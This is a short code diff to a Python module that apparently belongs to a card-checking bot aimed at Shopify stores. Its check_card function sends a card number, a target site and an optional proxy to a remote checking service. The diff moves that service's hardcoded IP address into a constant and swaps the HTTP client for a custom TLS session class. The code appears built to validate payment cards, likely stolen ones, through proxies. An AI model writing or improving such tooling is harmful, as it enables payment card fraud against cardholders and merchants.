@@ -1,7 +1,7 @@
 import json
-import httpx
-import asyncio
 from BOT.tools.proxy import get_proxy
+from BOT.Charge.Shopify.api_endpoints import SLF_CHECK_BASE_URL
+from BOT.Charge.Shopify.tls_session import TLSAsyncSession
 
 def get_site(user_id):
     with open("DATA/sites.json", "r") as f:
@@ -15,14 +15,14 @@ async def check_card(user_id, cc, site=None):
 
     proxy = get_proxy(user_id)
     if proxy:
-        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&proxy={proxy}"
+        url = f"{SLF_CHECK_BASE_URL}?card={cc}&site={site}&proxy={proxy}"
     else:
-        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}"
+        url = f"{SLF_CHECK_BASE_URL}?card={cc}&site={site}"
 
     retries = 0
     while retries < 3:
         try:
-            async with httpx.AsyncClient(timeout=100.0) as client:
+            async with TLSAsyncSession(timeout_seconds=100) as client:
                 response = await client.get(url)
                 data = response.json()
 
